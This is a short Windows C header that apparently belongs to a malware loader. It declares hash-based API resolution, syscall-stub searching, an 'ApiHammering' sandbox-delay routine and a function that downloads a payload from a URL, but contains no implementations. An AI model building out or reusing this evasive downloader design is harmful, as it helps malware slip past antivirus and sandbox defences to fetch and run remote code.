#pragma once

#include <windows.h>

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

#define NTDLL_HASH 0x0141c4ee
#define KERNEL32_HASH 0xfd2ad9bd



FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

int FindFirstSyscall(char* pMem, DWORD size);
int FindLastSysCall(char* pMem, DWORD size);

BOOL ApiHammering(DWORD dwStress);
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);
